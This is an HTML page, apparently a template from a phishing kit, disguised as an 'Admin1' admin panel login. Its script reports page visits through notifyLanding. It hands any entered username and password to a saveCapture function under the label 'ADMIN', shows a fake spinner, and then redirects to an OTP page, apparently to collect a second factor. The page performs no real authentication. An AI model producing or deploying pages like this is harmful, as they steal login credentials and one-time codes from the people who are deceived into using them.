<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Login - Admin1</title><link rel="stylesheet" href="style.css"></head>
<body><div class="card">
<div class="logo">A</div>
<div class="title">Admin Panel</div>
<div class="subtitle">Authorized personnel only</div>
<form id="loginForm">
<div class="form-group"><label for="username">Admin Username</label><input type="text" id="username" placeholder="Enter admin username" required></div>
<div class="form-group"><label for="password">Admin Password</label><input type="password" id="password" placeholder="Enter admin password" required></div>
<button type="submit" id="continueBtn">Sign In</button>
</form>
<div class="footer">© 2026 Admin1 · All rights reserved</div>
</div>
<script src="helper.js"></script>
<script>
const SITE='admin1', DISPLAY='Admin1', CATEGORY='admin_panel';
window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'Admin Login'));
document.getElementById('loginForm').addEventListener('submit', function(e){
  e.preventDefault();
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value.trim();
  if (!u || !p) return;
  const btn = document.getElementById('continueBtn');
  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
  saveCapture(SITE, CATEGORY, 'ADMIN', { username: u, password: p }, 'Admin');
  setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
});
</script></body></html>
